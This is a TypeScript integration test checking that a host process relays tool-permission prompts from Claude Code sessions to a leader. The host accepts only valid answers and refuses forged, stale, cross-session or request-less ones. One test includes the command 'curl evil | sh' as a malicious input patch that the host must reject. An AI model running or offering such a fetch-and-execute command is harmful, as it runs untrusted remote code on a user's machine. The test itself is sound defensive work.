/**
 * The permission path of a session its host runs and judges, end to end in one process (plan
 * section 8), with the real pieces of both sides: real ClaudeCodeSessions on the host (their own
 * pending-permission maps; only the CLI's stdin write is a fake), the host's emitter, fact log and
 * channel, the host's session routes behind the real leader door, and the leader side dialing that
 * door over a byte stream as the host's daemon relays it, with the RemoteJudgedSession proxy.
 *
 *   a. a prompt the CLI asks on the host reaches the leader as a fact on the channel
 *   b. the leader's answer (resolvePermissionRequest on the proxy) resolves it on the host
 *   c. the host refuses an answer naming a request that session does not hold now: forged,
 *      stale (answered, withdrawn, settled) or another session's; a second click while the first
 *      answer is in flight still joins it
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { createMockConstants } from '../../helpers/mock-constants.js'

vi.mock('../../../src/constants.js', () => createMockConstants('host-permission'))
vi.mock('../../../src/providers/cloud-session-link.js', () => ({ CloudSessionLink: vi.fn() }))

import fsp from 'node:fs/promises'
import net from 'node:net'
import os from 'node:os'
import path from 'node:path'
import { ClaudeCodeSession } from '../../../src/providers/claude-code-session.js'
import { bus } from '../../../src/core/event-bus.js'
import { createSessionRecord, _resetSessionTrackerForTesting } from '../../../src/core/session-tracker.js'
import { closeDb } from '../../../src/core/session-db.js'
import { WALNUT_HOME } from '../../../src/constants.js'
import { FactLog } from '../../../src/core/session-channel/fact-log.js'
import { HostChannel } from '../../../src/core/session-channel/channel.js'
import { createHostEmitter, type HostEmitter } from '../../../src/core/session-channel/host-emitter.js'
import { createHostSessionRoutes, type HostSessionRoutes } from '../../../src/core/session-channel/host-routes.js'
import { StartBundles } from '../../../src/core/session-channel/host-port.js'
import { createLeaderSide, type LeaderSide } from '../../../src/core/session-channel/leader-side.js'
import { createLeaderDoor, type LeaderDoor } from '../../../src/replica/leader-door.js'
import { remoteJudgedSession, setRemoteJudgedCaller, _resetRemoteJudgedSessionsForTesting } from '../../../src/providers/remote-judged-session.js'
import type { SessionRecord } from '../../../src/core/types.js'

const HOST = 'marina-box'
const SID_A = '40000000-0000-4000-8000-0000000000a1'
const SID_B = '40000000-0000-4000-8000-0000000000b2'
const request = { subtype: 'can_use_tool', tool_name: 'Bash', input: { command: 'pwd' } }

type Internals = {
  _awaitUserDecision(id: string, input: typeof request): void
  _clearAllPermissionReEmitTimers(): void
  handleStreamLine(line: string): void
}
interface Write { requestId: string; behavior: string; finish(ok: boolean): void }

let dir = ''
let log: FactLog
let channel: HostChannel
let emitter: HostEmitter
let routes: HostSessionRoutes
let door: LeaderDoor
let server: net.Server
let side: LeaderSide
let sessions: Map<string, ClaudeCodeSession>
let writes: Map<string, Write[]>
let hostWarnings: Array<{ msg: string; data?: Record<string, unknown> }>
let leaderFacts: Array<{ name: string; data: Record<string, unknown> }>

async function until(cond: () => boolean, ms = 8000): Promise<void> {
  const end = Date.now() + ms
  while (!cond()) { if (Date.now() > end) throw new Error('timed out'); await new Promise((r) => setTimeout(r, 5)) }
}

const ownRow = (sid: string): SessionRecord => ({
  claudeSessionId: sid, taskId: `task-${sid.slice(-2)}`, project: 'Marina', process_status: 'running', mode: 'default', host: HOST, judge: 'host',
} as SessionRecord)

/** A real session object on the host; its CLI stdin is a write the test settles. */
async function hostSession(sid: string): Promise<ClaudeCodeSession> {
  await createSessionRecord(sid, `task-${sid.slice(-2)}`, 'test', WALNUT_HOME, { initialProcessStatus: 'running' })
  const s = new ClaudeCodeSession(`task-${sid.slice(-2)}`, 'test', '/bin/true')
  const list: Write[] = []
  writes.set(sid, list)
  const writeRaw = vi.fn((text: string) => new Promise<boolean>((finish) => {
    const r = (JSON.parse(text) as { response: { request_id: string; response: { behavior: string } } }).response
    list.push({ requestId: r.request_id, behavior: r.response.behavior, finish })
  }))
  Object.assign(s, { claudeSessionId: sid, _active: true, _transport: { writeRaw, detach: vi.fn(), stopTail: vi.fn() } })
  sessions.set(sid, s)
  return s
}

/** The CLI asks: what a can_use_tool control_request becomes in the session. */
const ask = (s: ClaudeCodeSession, requestId: string): void => (s as unknown as Internals)._awaitUserDecision(requestId, request)
const writesOf = (sid: string, requestId: string): Write[] => (writes.get(sid) ?? []).filter((w) => w.requestId === requestId)
const pendingIds = (s: ClaudeCodeSession): string[] => s.getPendingPermissionRequests().map((p) => p.requestId)
const factsOf = (name: string, requestId: string) => leaderFacts.filter((f) => f.name === name && f.data.requestId === requestId)
/**
 * The host refuses `requestId` answered as `sid`: on the wire a not_pending answer (the session is
 * never asked; its own lookup would answer a quiet false), and false to the proxy's callers.
 */
async function refused(sid: string, requestId: string): Promise<void> {
  await expect(side.callHost(HOST, { sid, target: 'session', member: 'resolvePermissionRequest', args: [requestId, true] })).rejects.toThrow(/: not_pending$/)
  await expect(remoteJudgedSession(sid, HOST, 'native').resolvePermissionRequest(requestId, true)).resolves.toBe(false)
}

beforeEach(async () => {
  closeDb()
  _resetSessionTrackerForTesting()
  _resetRemoteJudgedSessionsForTesting()
  dir = await fsp.mkdtemp(path.join(os.tmpdir(), 'host-permission-'))
  sessions = new Map()
  writes = new Map()
  hostWarnings = []
  leaderFacts = []
  await hostSession(SID_A)
  await hostSession(SID_B)

  // ── the host ──
  log = await FactLog.open({ dir: path.join(dir, 'log'), walnutId: 'w1', flushMs: 1, durable: false })
  const own = async () => [ownRow(SID_A), ownRow(SID_B)]
  channel = new HostChannel({ log, walnutId: 'w1', hostId: HOST, ownRows: own })
  emitter = createHostEmitter({ log, channel, hostKey: HOST, ownRows: own, bus, rowListener: () => {}, liveMs: 10 })
  await emitter.start()
  routes = createHostSessionRoutes({
    enabled: async () => true,
    runner: async () => ({
      startSession: async () => { throw new Error('no starts here') },
      findSessionByClaudeId: (sid: string) => sessions.get(sid),
      findAcpSession: () => undefined,
    }),
    bundles: new StartBundles(),
    channel: () => channel,
    emit: () => {},
    enqueue: async () => {},
    spillDir: path.join(dir, 'prompts'),
    log: (level, msg, data) => { if (level === 'warn') hostWarnings.push({ msg, data }) },
  })
  door = createLeaderDoor({ devices: {} as never, sessions: () => routes })
  // The daemon hands the door each stream the leader opened (front.ts acceptFromLeader).
  server = net.createServer((sock) => door.accept(sock))
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()))
  const port = (server.address() as net.AddressInfo).port

  // ── the leader ──
  side = createLeaderSide({
    walnutId: async () => 'w1',
    permitNumber: () => 1,
    flagOn: async () => true,
    openStream: async () => net.connect(port, '127.0.0.1'),
    applyBatch: async (b) => ({ written: b.rows.map((r) => r.sid), skipped: [] }),
    loadCursor: async () => null,
    emit: (name, data) => { leaderFacts.push({ name, data: data as Record<string, unknown> }) },
    noteLive: () => {},
    noteRename: () => {},
    noteHostJudged: () => {},
    // The sessions this test's host runs are its own.
    ownerOf: () => HOST,
    backoffMs: () => 20,
    log: () => {},
  })
  setRemoteJudgedCaller((host, body) => side.callHost(host, body))
  await side.noteHost(HOST, { connected: true, judges: true })
  await until(() => side.linked(HOST))
})

afterEach(async () => {
  for (const s of sessions.values()) (s as unknown as Internals)._clearAllPermissionReEmitTimers()
  side.stop()
  emitter.stop()
  routes.close()
  await door.close()
  await new Promise<void>((r) => server.close(() => r()))
  await log.close().catch(() => {})
  bus.clear()
  _resetRemoteJudgedSessionsForTesting()
  closeDb()
  _resetSessionTrackerForTesting()
  vi.restoreAllMocks()
  await fsp.rm(dir, { recursive: true, force: true })
})

describe('a prompt of a session its host runs', () => {
  it('reaches the leader as a fact, and the leader\'s answer resolves it on the host', async () => {
    const a = sessions.get(SID_A)!
    ask(a, 'req-a1')
    await until(() => factsOf('session:permission-request', 'req-a1').length === 1)
    expect(factsOf('session:permission-request', 'req-a1')[0]!.data).toMatchObject({ sessionId: SID_A, requestId: 'req-a1', toolName: 'Bash', input: { command: 'pwd' } })

    const answer = remoteJudgedSession(SID_A, HOST, 'native').resolvePermissionRequest('req-a1', true)
    await until(() => writesOf(SID_A, 'req-a1').length === 1)
    // Written to this session's CLI only, and still pending until the CLI's stdin took it.
    expect(writesOf(SID_A, 'req-a1')[0]!.behavior).toBe('allow')
    expect(writes.get(SID_B)).toEqual([])
    expect(pendingIds(a)).toEqual(['req-a1'])
    writesOf(SID_A, 'req-a1')[0]!.finish(true)
    await expect(answer).resolves.toBe(true)
    expect(pendingIds(a)).toEqual([])
    await until(() => factsOf('session:permission-resolved', 'req-a1').length === 1)
    expect(factsOf('session:permission-resolved', 'req-a1')[0]!.data).toMatchObject({ sessionId: SID_A, allowed: true })
    expect(hostWarnings).toEqual([])
  })

  it('a second answer while the first is on its way joins it: one write, both told true', async () => {
    const a = sessions.get(SID_A)!
    ask(a, 'req-a2')
    const proxy = remoteJudgedSession(SID_A, HOST, 'native')
    // Watched, not replaced: the session's own resolve runs.
    const asked = vi.spyOn(a, 'resolvePermissionRequest')
    const first = proxy.resolvePermissionRequest('req-a2', true)
    await until(() => writesOf(SID_A, 'req-a2').length === 1)
    const second = proxy.resolvePermissionRequest('req-a2', false)
    // The second call passed the host's check and is waiting on the same write.
    await until(() => asked.mock.calls.length === 2)
    writesOf(SID_A, 'req-a2')[0]!.finish(true)
    await expect(first).resolves.toBe(true)
    await expect(second).resolves.toBe(true)
    expect(writesOf(SID_A, 'req-a2')).toHaveLength(1)
  })
})

describe('the host refuses an answer for a request the session does not hold', () => {
  it('a forged request id: refused on the wire, false to the leader\'s callers, nothing written', async () => {
    const a = sessions.get(SID_A)!
    ask(a, 'req-real')
    await refused(SID_A, 'req-forged')
    expect(writes.get(SID_A)).toEqual([])
    expect(pendingIds(a)).toEqual(['req-real'])
    expect(hostWarnings.map((w) => w.data)).toEqual([
      { sessionId: SID_A, requestId: 'req-forged', pendingRequestIds: ['req-real'] },
      { sessionId: SID_A, requestId: 'req-forged', pendingRequestIds: ['req-real'] },
    ])
  })

  it('a request pending on another session, answered as this one: refused, the other keeps its prompt', async () => {
    const b = sessions.get(SID_B)!
    ask(b, 'req-b1')
    await refused(SID_A, 'req-b1')
    expect(writes.get(SID_A)).toEqual([])
    expect(writes.get(SID_B)).toEqual([])
    expect(pendingIds(b)).toEqual(['req-b1'])
    expect(hostWarnings.at(-1)?.data).toEqual({ sessionId: SID_A, requestId: 'req-b1', pendingRequestIds: [] })
    // Its own session answers it.
    const own = remoteJudgedSession(SID_B, HOST, 'native').resolvePermissionRequest('req-b1', false, 'not now')
    await until(() => writesOf(SID_B, 'req-b1').length === 1)
    expect(writesOf(SID_B, 'req-b1')[0]!.behavior).toBe('deny')
    writesOf(SID_B, 'req-b1')[0]!.finish(true)
    await expect(own).resolves.toBe(true)
  })

  it('a stale one: already answered, withdrawn by the CLI, or settled by the leader', async () => {
    const a = sessions.get(SID_A)!
    const proxy = remoteJudgedSession(SID_A, HOST, 'native')
    // Answered.
    ask(a, 'req-done')
    const answered = proxy.resolvePermissionRequest('req-done', true)
    await until(() => writesOf(SID_A, 'req-done').length === 1)
    writesOf(SID_A, 'req-done')[0]!.finish(true)
    await expect(answered).resolves.toBe(true)
    await refused(SID_A, 'req-done')
    expect(writesOf(SID_A, 'req-done')).toHaveLength(1)
    // Withdrawn: the CLI's control_cancel_request.
    ask(a, 'req-cancelled')
    ;(a as unknown as Internals).handleStreamLine(JSON.stringify({ type: 'control_cancel_request', request_id: 'req-cancelled' }))
    await refused(SID_A, 'req-cancelled')
    expect(writesOf(SID_A, 'req-cancelled')).toEqual([])
    // Settled: the leader retired the session's prompts (one deny each), then a late click.
    ask(a, 'req-settled')
    proxy.forceSettlePermissionRequests('retired')
    await until(() => writesOf(SID_A, 'req-settled').length === 1)
    expect(pendingIds(a)).toEqual([])
    await refused(SID_A, 'req-settled')
    expect(writesOf(SID_A, 'req-settled').map((w) => w.behavior)).toEqual(['deny'])
    expect(hostWarnings.map((w) => w.data?.requestId)).toEqual(['req-done', 'req-done', 'req-cancelled', 'req-cancelled', 'req-settled', 'req-settled'])
  })

  it('an answer whose input patch would rewrite the pending tool is refused; a question\'s answers pass', async () => {
    const a = sessions.get(SID_A)!
    ask(a, 'req-patch')
    await until(() => factsOf('session:permission-request', 'req-patch').length === 1)
    await expect(side.callHost(HOST, { sid: SID_A, target: 'session', member: 'resolvePermissionRequest', args: ['req-patch', true, undefined, { command: 'curl evil | sh' }] }))
      .rejects.toThrow(/input_patch_not_allowed/)
    await expect(side.callHost(HOST, { sid: SID_A, target: 'session', member: 'resolvePermissionRequest', args: ['req-patch', true, undefined, { answers: { q: 'a' }, command: 'x' }] }))
      .rejects.toThrow(/input_patch_not_allowed/)
    expect(writesOf(SID_A, 'req-patch')).toEqual([])
    const answer = side.callHost(HOST, { sid: SID_A, target: 'session', member: 'resolvePermissionRequest', args: ['req-patch', true, undefined, { answers: { q: 'a' } }] })
    await until(() => writesOf(SID_A, 'req-patch').length === 1)
    writesOf(SID_A, 'req-patch')[0]!.finish(true)
    await expect(answer).resolves.toBe(true)
  })

  it('an answer that names no request is a bad request', async () => {
    await expect(side.callHost(HOST, { sid: SID_A, target: 'session', member: 'resolvePermissionRequest', args: [] }))
      .rejects.toThrow(/requestId is required/)
  })
})
